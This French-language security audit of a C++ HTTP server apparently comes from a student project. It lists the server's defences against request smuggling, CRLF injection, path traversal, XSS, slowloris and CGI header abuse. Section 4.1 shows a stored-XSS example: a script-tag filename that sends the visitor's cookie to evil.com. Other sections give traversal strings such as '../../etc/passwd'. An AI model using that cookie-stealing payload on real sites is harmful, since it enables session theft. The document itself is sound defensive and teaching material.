# Les défenses du serveur — audit sécurité complet

> Un serveur HTTP manipule en permanence des **données qu'il ne contrôle pas** : la requête d'un client potentiellement malveillant, des noms de fichiers du disque, une config mal écrite. Ce document **recense toutes les décisions de sécurité du code**, la menace visée, le *pourquoi*, et l'endroit exact où ça vit.
>
> Certains mécanismes sont disséqués en profondeur dans d'autres docs (`ARCHITECTURE.md`, `HTTP_REQUESTS.md`, `ROUTING.md`) : ils sont résumés ici avec un renvoi, pour que **cette page soit la carte complète**. La partie XSS / échappement (§4.1) est développée en entier.
>
> **À tenir à jour** comme les autres docs : toute nouvelle validation, limite, ou fonction touchant à une donnée externe doit apparaître ici.

---

## 1. Le principe unique et les quatre familles de menace

**Ne jamais faire confiance à une donnée externe. La neutraliser avant de l'utiliser dans un contexte sensible.**

On classe les menaces en quatre familles, qui reviennent partout :

| Famille | Ce que l'attaquant obtient | Exemple chez nous |
|---|---|---|
| **Fuite d'information** | lire ce qu'il ne devrait pas | path traversal → `/etc/passwd` ; listing d'un dossier privé |
| **Injection** | faire interpréter sa donnée comme du code/structure | CRLF injection, request smuggling, XSS |
| **Déni de service (DoS)** | rendre le serveur indisponible | slowloris, body de 2 Go, débordement mémoire |
| **Corruption mémoire** | use-after-free, double-free, FD réutilisé | invariant `delete this`, `close` unique |

Deux **directions** structurent tout : ce qui **entre** (la requête) et ce qui **sort** (la réponse). Retiens le parallèle central : **l'anti-traversal (entrée, §3.1) et l'échappement HTML (sortie, §4.1) sont la même idée** — neutraliser une donnée avant de l'utiliser.

---

## 2. Entrée — le parseur HTTP (protocole)

*(Tout dans `Http/HttpRequestClass.cpp` ; détail dans `HTTP_REQUESTS.md` §17.)*

### 2.1 Validation stricte de la request line
`parseRequestLine` valide **dans l'ordre** : exactement 3 champs (`400`), méthode en majuscules A–Z seulement (`400`), pas de caractère de contrôle dans l'URI (`400`), version ∈ {1.0, 1.1} (`505`), méthode ∈ {GET, POST, DELETE} (`501`), URI en origin-form (`400`), percent-decode valide (`400`), pas de ctl char dans le path **décodé** (`400`). Une ligne cassée est refusée **avant** toute logique — *fail-fast*.

### 2.2 Caractères de contrôle dans l'URI (avant décodage)
Un caractère de contrôle (codes 0–31, 127 — invisibles : `\0`, `\r`, `\n`…) dans une URL est anormal et sert à **casser la structure ligne-par-ligne** (injection CRLF). Rejet en `400`. **Menace : injection.**

### 2.3 Percent-decoding + re-vérification après décodage
Les attaques par **encodage** (`%00` = NUL, `%0d%0a` = CRLF) passent inaperçues sous forme encodée (que des caractères imprimables) et ne redeviennent dangereuses qu'**une fois décodées**. `percentDecode` refuse un `%` non suivi de 2 hexa (`400`) ; puis on **re-teste** l'absence de ctl chars sur le résultat décodé (`400`). La règle est écrite **une seule fois**, côté résultat. **Menace : injection.**

### 2.4 Validation des headers
`parseHeaderLine` : `:` obligatoire et clé non vide (`400`) ; clé sans caractère ≤ espace ni DEL (`400` — un `Ho st:` est du smuggling potentiel) ; valeur *trimmée*, ctl chars interdits sauf tab ; clé normalisée **en minuscules** (la casse devient un non-sujet). **Menace : injection / smuggling.**

### 2.5 Request smuggling — doublons interdits
Si deux intermédiaires interprètent différemment où finit une requête, un attaquant glisse une requête « invisible » entre eux. Les trois headers qui décident *qui répond* et *où finit le corps* sont verrouillés : `Host`, `Content-Length`, `Transfer-Encoding` **en double → `400`** ; `Content-Length` **+** `Transfer-Encoding` ensemble → `400`. Les autres doublons sont fusionnés (`v1, v2`, autorisé par la RFC). **Menace : injection.**

### 2.6 `Host` obligatoire en HTTP/1.1
Sans `Host`, `400` : la norme l'exige, et il nous faut le `Host` pour choisir le bon virtual host (sinon ambiguïté sur *qui* répond). **Menace : injection / confusion de routage.**

### 2.7 Débordement d'entier (integer overflow)
`Content-Length: 18446744073709551616` pourrait, en conversion naïve, **boucler** en non-signé et devenir `0`/`1` → le serveur croit « corps vide » alors qu'un flot arrive. `parseSizeValue` (et son jumeau hexa `parseHexValue` pour les tailles de chunk) teste le débordement **avant** qu'il n'arrive : `out > (SIZE_MAX - digit) / 10`, tout calculable sans jamais déborder. **Menace : injection / DoS.**

### 2.8 Chunked — sécurité du dé-chunking
`stepChunkSize` : extensions après `;` ignorées, hexa invalide → `400`, **et limite vérifiée chunk par chunk** (`_body.size() + _chunkSize > _maxBodySize` → `413`, avec test d'overflow avant l'addition). `stepChunkCrlf` : le `\r\n` **après** les données est obligatoire (`400` sinon) — preuve que client et serveur sont d'accord sur la taille annoncée. `stepTrailer` : trailers consommés puis **jetés**. **Menace : injection / DoS.**

### 2.9 Limites de taille (anti-gonflement mémoire)
Trois garde-fous contre un client qui veut gonfler notre mémoire à l'infini : `MAX_REQUEST_LINE` (8192 → `414`), `MAX_HEADER_BYTES` (32768, sas **et** cumul → `400`), `client_max_body_size` (→ `413`). La limite de body est **appliquée pendant la lecture** (dès le `Content-Length` annoncé, ou chunk par chunk) — on refuse `413` **sans lire 2 Go pour rien**. **Menace : DoS.**

### 2.10 La limite qui arrive « en retard », mais bornée
`client_max_body_size` dépend du vhost, connu seulement après les headers. Entre la fin des headers et l'application de la limite (`setMaxBodySize`, qui **revalide rétroactivement** le `Content-Length` et le body déjà lu → `413`), il s'écoule **au plus un `append`**, donc au plus `MAX_REQUEST` (4096) octets — jamais 2 Go. La fenêtre d'exposition est **bornée par conception**. **Menace : DoS.** *(Détail `HTTP_REQUESTS.md` §17.9.)*

### 2.11 État d'erreur terminal et absorbant
`S_ERROR` est terminal : dès qu'une erreur est détectée à n'importe quelle profondeur, `append` s'arrête net (l'état est testé à chaque tour de boucle). Impossible de « continuer à parser » une requête déjà jugée invalide. **Menace : injection / confusion d'état.**

---

## 3. Entrée — le routing (système de fichiers)

*(Tout dans `Router/RouterClass.cpp` ; détail dans `ROUTING.md`.)*

### 3.1 Path traversal — défense lexicale
`/uploads/../../etc/passwd` chercherait à **sortir du dossier autorisé**. `normalizeRemainder` simule une pile de segments : `.` ignoré, `..` dépile, **pile vide sur un `..` → évasion → `403`**. Purement **lexical** (sur la chaîne), pas de `realpath` (non autorisé, et on ne veut pas dépendre de l'état du disque ni des liens symboliques). **Menace : fuite d'information.**

### 3.2 Mapping alias contrôlé + frontière stricte de location
Le préfixe de la location est retiré avant d'appliquer `root` (comportement *alias*, cf. sujet). Le matching de location exige une **frontière sur `/`** : `/uploads` ne matche jamais `/uploadsxyz` (sinon un fichier inattendu pourrait être servi sous une location aux mauvaises règles). **Menace : fuite / confusion de règles.**

### 3.3 Ne servir que des fichiers réguliers et des dossiers
`handleGet` teste `S_ISDIR`/`S_ISREG`. Tout le reste (`/dev/*`, sockets, FIFO, périphériques…) → `404`. On ne sert **jamais** un fichier spécial : ouvrir `/dev/random` ou une FIFO pourrait **bloquer** le serveur ou fuiter des données système. **Menace : DoS / fuite.**

### 3.4 Respect des permissions
Si `open` échoue (droits insuffisants) → `403`. On ne contourne pas les permissions du système de fichiers. **Menace : fuite d'information.**

### 3.5 Autoindex — pas de divulgation d'arborescence
`autoindex off` sur un dossier sans index → `403` : on ne **révèle pas** le contenu d'un dossier qu'on n'a pas explicitement décidé d'exposer. Si `opendir` échoue → `403` (pas de demi-listing). **Menace : fuite d'information.**

### 3.6 Méthodes autorisées par route
Une méthode connue mais interdite sur la route → `405` + header `Allow`. Chaque location déclare **explicitement** ses méthodes : réduire ce qui est permis, c'est réduire la surface d'attaque. **Menace : réduction de surface.**

### 3.7 Upload — confinement du `filename` dans `upload_store`
Le `filename` d'un multipart (ou le nom déduit de l'URL) **vient du client** : il peut valoir `../../etc/cron.d/x`. `sanitizeFilename` (`Router/UploadClass.cpp`) ne garde que le **basename** (après le dernier `/` ou `\`) et rejette `.`/`..` → l'écriture ne peut **jamais** sortir de `upload_store`. C'est le pendant de l'anti-traversal du GET (§3.1), mais sur une donnée venue du **corps**, pas de l'URL. Défense en profondeur : une URL de traversal (`POST /uploads/../../x`) est **en plus** bloquée par `resolveFsPath` (§3.1), qui tourne pour toutes les méthodes. **Menace : fuite / écrasement de fichier arbitraire.**

---

## 4. Sortie — la réponse

### 4.1 Échappement HTML / XSS *(le cœur de ce doc)*

Quand on génère une page (le listing d'`autoIndex`), on y insère des **données non fiables** : les noms de fichiers.

**Le mécanisme.** Le HTML a des caractères **structurels** : `<` ouvre une balise, `>` la ferme, `"` et `'` délimitent un attribut, `&` commence une entité. Le navigateur ne distingue pas « le HTML que j'ai écrit » de « la donnée que j'ai collée » — il lit tout pareil. **HTML-échapper** = remplacer ces caractères par leur **entité** équivalente pour qu'ils s'**affichent** comme texte au lieu d'être **interprétés** comme structure. Notre `htmlEscape` :

```cpp
'&'  ->  "&amp;"     // à traiter EN PREMIER (sinon on ré-échapperait les & introduits)
'<'  ->  "&lt;"
'>'  ->  "&gt;"
'"'  ->  "&quot;"
'\'' ->  "&#39;"     // apostrophe : numérique, car &apos; n'existe pas en HTML 4
```

**L'attaque (XSS, Cross-Site Scripting).** Injecter du code (JavaScript) dans une page, exécuté dans le navigateur d'une **victime** avec ses droits (vol de cookies de session, actions en son nom). Scénario concret **sans** échappement : un attaquant crée un fichier nommé

```
<script>document.location='http://evil.com/vole?c='+document.cookie</script>
```

(nom valide sur beaucoup de systèmes). Le listing collerait ce nom tel quel → tout visiteur exécuterait le `<script>`. C'est une XSS **stockée** (payload stocké côté serveur sous forme de nom de fichier, déclenché à chaque affichage). **Avec** échappement, `<script>` devient `&lt;script&gt;` : affiché, pas exécuté. Neutralisé.

**Les entités HTML.** Trois formes :

```
&nom;      entité NOMMÉE               ex : &lt;   &amp;   &copy;
&#N;       entité NUMÉRIQUE (décimal)   ex : &#60;  ('<' a le code 60)
&#xH;      entité NUMÉRIQUE (hexa)      ex : &#x3C;
```

`N` = le code ASCII/Unicode du caractère (le même que pour les ctl chars, §2.2). Le **jeu essentiel** (recommandation OWASP pour un contexte HTML) :

| Caractère | Nommée | Numérique | Danger |
|---|---|---|---|
| `&` | `&amp;` | `&#38;` | démarre une entité — **échapper en premier** |
| `<` | `&lt;` | `&#60;` | ouvre une balise |
| `>` | `&gt;` | `&#62;` | ferme une balise |
| `"` | `&quot;` | `&#34;` | ferme un attribut `href="..."` |
| `'` | `&#39;` | `&#39;` | ferme un attribut en guillemets simples |

Deux pièges : **l'ordre** (`&` d'abord — sinon `&lt;` deviendrait `&amp;lt;` ; notre boucle traite caractère par caractère en une passe, donc évité) ; **`&apos;` n'existe pas en HTML 4** (d'où `&#39;`). On applique `htmlEscape` au **nom affiché ET à l'attribut `href`** dans `autoIndex`. **Menace : injection (XSS).** *(Détail `ROUTING.md` §6.)*

### 4.2 `Content-Length` calculé, jamais fourni
`HttpResponse::serialize` calcule `Content-Length = _body.size()` au moment de sérialiser. Un `Content-Length` écrit à la main finirait par mentir (body modifié) — et un `Content-Length` faux **casse le keep-alive** et ouvre du **response smuggling** (le client lit trop/pas assez, les requêtes suivantes sont décalées). **Menace : injection / desync.** *(Détail `HTTP_REQUESTS.md` §18.)*

### 4.3 `error_page` — pas de récursion, fallback
`makeError` sert la page custom si déclarée, mais **retombe** sur la page par défaut si le fichier est absent/illisible — **sans se rappeler lui-même** (pas de boucle infinie). Une config d'error_page cassée ne peut donc pas faire planter/bloucler le serveur. **Menace : DoS (disponibilité).**

---

## 5. Robustesse du process (mémoire, FD, disponibilité)

*(Détail dans `ARCHITECTURE.md`.)*

### 5.1 Un seul `close`, dans `~Arole`
Le `close()` d'un FD n'existe **qu'à un endroit** (`~Arole`, gardé par `if (_fd != -1)`). Fermer un FD à deux endroits permettrait au système de **réattribuer** ce numéro à une nouvelle connexion entre-temps, qu'on fermerait alors par erreur (on agirait sur le **mauvais** client). Centraliser rend ce bug impossible. **Menace : corruption / confusion de connexion.**

### 5.2 Invariant `delete this` + `return`
`Client::closeConnection` fait `delete this`. Tout appel qui **peut** fermer la connexion (`closeConnection`, `manager.add/mod/del`, `handleRead` qui renvoie `false`) est **immédiatement suivi d'un `return`** — sinon **use-after-free** (on toucherait un objet détruit). **Menace : corruption mémoire.**

### 5.3 FD non-bloquants + un seul `poll`
Tous les FD socket/pipe sont `O_NONBLOCK`, et l'unique `epoll` ne touche un FD que quand le noyau le dit prêt. Un client lent ne peut donc **jamais figer** le serveur mono-thread sur un `recv`/`accept` bloquant. **Menace : DoS.**

### 5.4 Jamais `errno` après `recv`/`send` ; `EPOLLERR|EPOLLHUP` d'abord
On déduit l'état de la **valeur de retour** seule (`recv==0` → fermé ; `<0`/`<=0` → réessayer). Les vraies erreurs reviennent via `EPOLLERR|EPOLLHUP`, testés **en premier** dans `handle_event`. Robuste face aux connexions cassées, sans dépendre d'`errno` (interdit + peu fiable). **Menace : robustesse.**

### 5.5 Drain + half-close
Sur une erreur 4xx/5xx alors que le client envoie encore son body, on lit `EPOLLIN|EPOLLOUT` **en même temps** : on **jette** ce qui arrive (`_draining`) tout en poussant la réponse, pour éviter le **deadlock** (client qui bloque en écriture pendant qu'on bloque en attente). Le half-close (`recv==0` pendant le drain) bascule en `EPOLLOUT` seul pour livrer quand même le `400`/`413`. **Menace : DoS / robustesse.**

### 5.6 Timeouts — slowloris
Deux horloges, dont une **deadline absolue jamais rafraîchie** (`HEADER_TIMEOUT` 30 s, `REQUEST_TIMEOUT` 300 s) en plus de l'idle (60 s). Sans elle, un attaquant enverrait 1 octet toutes les 59 s et garderait un slot ouvert indéfiniment « en activité ». `epoll_wait` se réveille toutes les 5 s pour passer ce gardien même sans trafic. **Menace : DoS.** *(Détail `ARCHITECTURE.md` acte 8.)*

### 5.7 Pas de fuite mémoire / FD
`new`/`delete` explicites, destructeurs qui ferment les FD, `ServerManager` propriétaire unique des sockets et servers. À vérifier à `valgrind` à chaque ajout. **Menace : DoS (épuisement de ressources).**

---

## 6. Réduction de la surface d'attaque & config

### 6.1 Méthodes et versions limitées
Le parseur n'accepte que GET/POST/DELETE (`501` sinon) et HTTP/1.0/1.1 (`505` sinon). Tout ce qu'on **ne** traite **pas** est refusé tôt, proprement. **Menace : réduction de surface.**

### 6.2 Config *fail-fast* stricte
`ConfigParser` valide arité, placement et valeurs (port 1–65535, code 100–599, taille `1m`/`512k`), directive inconnue = erreur, avec numéro de ligne. Une config douteuse **arrête le démarrage** au lieu de produire un comportement surprenant exploitable. **Menace : mauvaise configuration.**

### 6.3 Signaux async-safe
Le handler `SIGINT` ne fait que poser un `volatile sig_atomic_t` (le seul type modifiable sans risque depuis un handler) — pas d'appel non-réentrant qui pourrait corrompre l'état. **Menace : corruption.**

---

## 7. Points de vigilance À VENIR (features non encore codées)

À traiter **au moment** d'implémenter, car ce sont des surfaces d'attaque classiques.

### 7.1 Upload (POST multipart) ✅ *(fait — voir §3.7)*
- **Traversal via le `filename`** → réglé par `sanitizeFilename` (§3.7).
- `client_max_body_size` respecté **par location** (§2.9–2.10).
- `Expect: 100-continue` émis (refinement, non sécuritaire).
- Attention : un upload **écrase** un fichier existant du même nom dans `upload_store` (`O_TRUNC`) — acceptable ici, à surveiller si le dossier contenait des fichiers sensibles.

### 7.2 DELETE ✅ *(fait)*
- **Anti-traversal** : `handleDelete` opère sur le `fsPath` de `resolveFsPath` (§3.1) → jamais hors du root.
- Ne supprime **que** des fichiers réguliers (dossier → `403`) ; droits respectés (échec `std::remove` → `403`) ; `404` si absent.
- **Contrainte** : suppression via `std::remove` (`<cstdio>`), `unlink` n'étant pas dans la liste autorisée — à valider avec l'évaluateur.

### 7.3 CGI ✅ (GET + POST — voir `docs/CGI.md`)
- Le CGI **exécute du code arbitraire** : la partie la plus sensible. On ne lance que si le script **existe** et est **régulier**, chemin résolu par le **même anti-traversal** que le GET (`resolveCgi`→`mapPath`, §3.1).
- **Pipes stdin+stdout non-bloquants et dans l'epoll unique** ✅ (jamais de `read`/`write` sans readiness ; les deux ensemble → **pas de deadlock**).
- **Timeout `504` + `kill`** ✅ (un script infini ne fige pas un slot).
- **Pas de zombie** ✅ : `waitpid(WNOHANG)` + moisson par `Cgi::routine` (jamais de `waitpid` **bloquant** qui figerait le serveur mono-thread).
- **`SIGPIPE` ignoré** ✅ (`main`) : écrire sur un pipe dont le lecteur est mort ne tue pas le serveur.
- **Suppression différée des pipes** ✅ : anti use-after-free si le client part dans le même lot d'événements (cf. §3.7 même idée, et `docs/CGI.md` §7).
- **`FD_CLOEXEC` sur les pipes** ✅ (évite qu'un 2ᵉ CGI hérite du pipe du 1ᵉ → EOF jamais reçu).
- **`fork` uniquement dans `Cgi::start`** ✅ (A.8).
- **Env** : les headers passent en `HTTP_*` tels quels ; `REDIRECT_STATUS=200` pour php-cgi.
- **Aliasing tiret/underscore dans l'env** ✅ : la conversion CGI écrase `-` et `_` sur le **même** caractère, donc `X-Forwarded-For` et `X_Forwarded_For` — deux en-têtes **distincts** sur le fil, qu'aucun proxy en amont ne confond — produiraient **la même** variable `HTTP_X_FORWARDED_FOR`, l'une écrasant l'autre selon l'ordre de la `std::map` (et `_` = 0x5F trie **après** `-` = 0x2D, donc la version injectée gagnerait). Un script CGI qui déciderait d'une autorisation ou d'un log sur un `HTTP_X_*` serait donc trompable. Défense : `isExcludedFromEnv` (`Cgi/CgiClass.cpp`) **écarte de l'environnement tout nom d'en-tête contenant `_`** — c'est la règle `underscores_in_headers off` de NGINX, qui est son défaut. Aucun client légitime n'utilise l'underscore (la convention HTTP est le tiret), le coût est nul. Filtrage fait dans `buildEnv` et **pas** dans le parseur : sur le fil les deux noms sont non ambigus, l'ambiguïté naît de la conversion CGI — on corrige là où elle apparaît, sans changer le comportement HTTP du reste du serveur.
- **Hop-by-hop non transmis** ✅ : `connection`, `keep-alive`, `proxy-authenticate`, `proxy-authorization`, `te`, `trailer`, `transfer-encoding`, `upgrade` (RFC 7230 §6.1) décrivent la connexion TCP client↔webserv, pas le message. Le CGI est un **nouveau saut** : lui annoncer `HTTP_TRANSFER_ENCODING=chunked` alors qu'il reçoit un corps **déjà dé-chunké** l'inciterait à dé-chunker une seconde fois. Liste **noire** (ensemble fermé, normatif) et non blanche (l'ensemble des en-têtes applicatifs utiles est ouvert). Cf. `docs/CGI.md` §5 b-bis.
- **Sortie du CGI : hop-by-hop jetés** ✅ — *la défense symétrique de la précédente, dans l'autre sens*. Le §7.3 ci-dessus filtre ce qui entre dans le script ; celle-ci filtre ce qui en **sort**. La sortie d'un CGI est une **donnée externe** au même titre qu'une requête : le script peut écrire n'importe quel en-tête sur son `stdout`, et on le recopiait tel quel dans la réponse. `Cgi::buildResponse` écarte donc `connection`, `keep-alive`, `te`, `trailer`, `transfer-encoding`, `upgrade`, `proxy-*` (`isHopByHop`). Le cas dangereux est `Transfer-Encoding: chunked` : annoncé alors que nous émettons un corps en clair avec `Content-Length`, il ferait tenter au client un dé-chunkage de texte brut — **response splitting**, l'attaquant contrôlant alors où le client croit qu'une réponse finit et où la suivante commence.
- **`Content-Length` unique** ✅ — la réponse en portait **deux** dès qu'un script en émettait un : `buildResponse` recopiait celui du CGI et `HttpResponse::serialize` ajoutait le sien, calculé. RFC 7230 §3.3.2 : un message à plusieurs `Content-Length` est **invalide** — même valeurs identiques, c'est un désaccord de cadrage exploitable en **request smuggling** dès qu'un intermédiaire (proxy, cache) lit un en-tête et nous l'autre. Défense posée dans `HttpResponse::setHeader`, qui **ignore** `Content-Length` et `Transfer-Encoding` quelle que soit la casse (`isFramingHeader`) : le cadrage est un **invariant de classe**, pas une politesse d'appelant. Corriger au niveau de `HttpResponse` plutôt que dans `buildResponse` protège aussi le Router, le Client et tout code futur — même raisonnement que pour l'aliasing `_` ci-dessus : on corrige là où l'invariant vit, pas là où le symptôme est apparu.
- **Caractères de contrôle bannis des en-têtes de réponse** ✅ — *le pendant, côté sortie, de la validation d'entrée du §2*. `HttpResponse::setHeader` et `addHeader` rejettent (helper `hasCtl`) toute valeur contenant un octet `< 32` autre que la tabulation, ou `127` — donc `\r` et `\n` en premier lieu. Sans cette garde, une valeur d'en-tête portant un `CRLF` **termine l'en-tête courant et en ouvre un autre** : c'est le **response splitting**, l'attaquant décidant où le client croit qu'une réponse finit. Le vecteur est réel dès qu'on émet des cookies, parce qu'un script de session recopie volontiers une donnée venue du client (pseudo, champ de formulaire, valeur de cookie relue) dans un `Set-Cookie`. La garde vit dans `HttpResponse` et non dans le script : même raisonnement que pour `isFramingHeader` ci-dessus — **l'invariant appartient à la classe qui sérialise**, pas à ses appelants, donc il couvre aussi le Router, le Client et tout code futur. Prédicat volontairement identique à celui de `HttpRequest::parseHeaderLine` : ce qu'on refuse d'entrer, on refuse de le sortir.
- **Cookies : plusieurs `Set-Cookie` sans fusion** ✅ — `HttpResponse::_headers` est un `std::multimap` et `Set-Cookie` passe par `addHeader`. Ce n'est pas qu'une commodité : concaténer deux `Set-Cookie` **corrompt les données**. Par la virgule, la valeur est ambiguë (l'attribut `Expires` en contient déjà une) ; par le point-virgule, le second cookie est lu comme un **attribut inconnu du premier** et silencieusement jeté (RFC 6265 §5.2 : tout nom d'attribut non reconnu est ignoré). Une perte muette de cookie de session est difficile à diagnostiquer et peut, selon l'application, dégrader une authentification en anonymat non détecté.
- **ID de session validé avant usage** ✅ (`www/cgi-bin/session.py`) — la valeur du cookie `session_id` est une **donnée client** au même titre qu'une URL. Elle est vérifiée « exactement 32 caractères hexadécimaux » avant toute recherche ; sinon une nouvelle session est créée. Cela ferme l'injection de séparateurs (`\t`, `\n`) dans le fichier de stockage et toute tentative d'utiliser l'identifiant comme fragment de chemin. Les pseudos sont bornés en longueur et **percent-encodés** au stockage (aucun séparateur possible), puis **HTML-échappés** à l'affichage — de même que l'en-tête `Cookie` brut réaffiché sur la page, qui est intégralement contrôlé par le client (cf. §4 sur l'échappement).
- **`Connection` annoncé** ✅ : posé sur toutes les réponses CGI, y compris le `504` du timeout. Un serveur qui ferme sans l'annoncer (RFC 7230 §6.1) laisse le client réutiliser une connexion morte — requête perdue, et sur un proxy mutualisé, risque de désynchronisation.
- **`405` avant le `fork`** ✅ : `tryStartCgi` vérifie les méthodes autorisées de la location avant de lancer quoi que ce soit. Auparavant un `POST` sur une location CGI en `GET`-only **exécutait le script** puis renvoyait sa sortie : la restriction de méthode de la config était contournable sur toute location CGI, et chaque requête refusée coûtait un `fork` (surface DoS).
- **Reste ⬜** : `FD_CLOEXEC` **global** (epoll/sockets d'écoute/clients ne devraient pas fuir dans le processus CGI — aujourd'hui seuls les pipes sont protégés).

---

## 8. Tableau récapitulatif

| Menace | Famille | Direction | Défense | Où |
|---|---|---|---|---|
| Injection CRLF (encodée ou non) | injection | entrée | rejet ctl chars avant + après décodage | `HTTP_REQUESTS.md` §17.5 |
| Request smuggling | injection | entrée | doublons `Host`/`CL`/`TE` → `400`, `CL`+`TE` → `400` | §2.5 |
| Integer overflow (`CL`, chunk) | injection/DoS | entrée | test d'overflow réarrangé | §2.7 |
| Chunked malformé | injection/DoS | entrée | hexa, CRLF de chunk, `413` chunk-par-chunk | §2.8 |
| Gonflement mémoire | DoS | entrée | limites request line / headers / body | §2.9–2.10 |
| Path traversal (URL) | fuite | entrée | normalisation lexicale → `403` | §3.1 |
| Fichier spécial (`/dev`, FIFO) | DoS/fuite | entrée | `S_ISREG`/`S_ISDIR` seulement | §3.3 |
| Divulgation d'arborescence | fuite | entrée | `autoindex off` → `403` | §3.5 |
| **XSS (nom de fichier)** | **injection** | **sortie** | **échappement HTML** (`htmlEscape`, 5 caractères) | **§4.1** |
| Aliasing `-`/`_` dans l'env CGI | injection | entrée | noms contenant `_` écartés de `HTTP_*` | §7.3 |
| Response splitting via sortie CGI | injection | sortie | hop-by-hop du script jetés (`isHopByHop`) | §7.3 |
| `Content-Length` en double | smuggling | sortie | `setHeader` ignore les en-têtes de cadrage | §7.3 |
| CRLF dans une valeur d'en-tête | response splitting | sortie | `hasCtl` dans `setHeader`/`addHeader` | §7.3 |
| `Set-Cookie` fusionnés | perte de session | sortie | `multimap` + `addHeader`, jamais de concaténation | §7.3 |
| ID de session forgé | injection dans le store | entrée | 32 hex stricts, sinon nouvelle session | §7.3 |
| Méthode de location contournée en CGI | contrôle d'accès | routing | `405` vérifié **avant** le `fork` | §7.3 |
| Response desync | injection | sortie | `Content-Length` calculé | §4.2 |
| error_page cassée | DoS | sortie | fallback sans récursion | §4.3 |
| Double-close / FD réutilisé | corruption | process | `close` unique dans `~Arole` | §5.1 |
| Use-after-free | corruption | process | invariant `delete this` + `return` | §5.2 |
| Blocage mono-thread | DoS | process | FD non-bloquants + poll unique | §5.3 |
| Deadlock erreur/body | DoS | process | drain `EPOLLIN|EPOLLOUT` + half-close | §5.5 |
| Slowloris | DoS | process | deadline absolue non rafraîchie | §5.6 |
| Traversal via upload filename | fuite/écrasement | entrée | `sanitizeFilename` (basename seul) | §3.7 |
| CGI : code arbitraire | injection/DoS | — | ⬜ env maîtrisé, timeout, pipes non-bloquants | §7.3 |

---

## 9. Références externes

- **OWASP — XSS Prevention Cheat Sheet** : `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- **OWASP — Path Traversal** : `https://owasp.org/www-community/attacks/Path_Traversal`
- **OWASP — HTTP Request Smuggling** : `https://owasp.org/www-community/attacks/HTTP_Request_Smuggling`
- **OWASP — File Upload** (utile pour §7.1) : `https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`
- **MDN — Entités / références de caractères** : `https://developer.mozilla.org/fr/docs/Glossary/Entity`
- **WHATWG HTML spec — Named character references** (liste officielle complète) : `https://html.spec.whatwg.org/multipage/named-characters.html`

> Réflexe unique à garder en soutenance : devant chaque donnée, se demander **« d'où vient-elle, et dans quel contexte je vais l'utiliser ? »**. Externe + contexte sensible = neutraliser (valider en entrée, échapper en sortie).
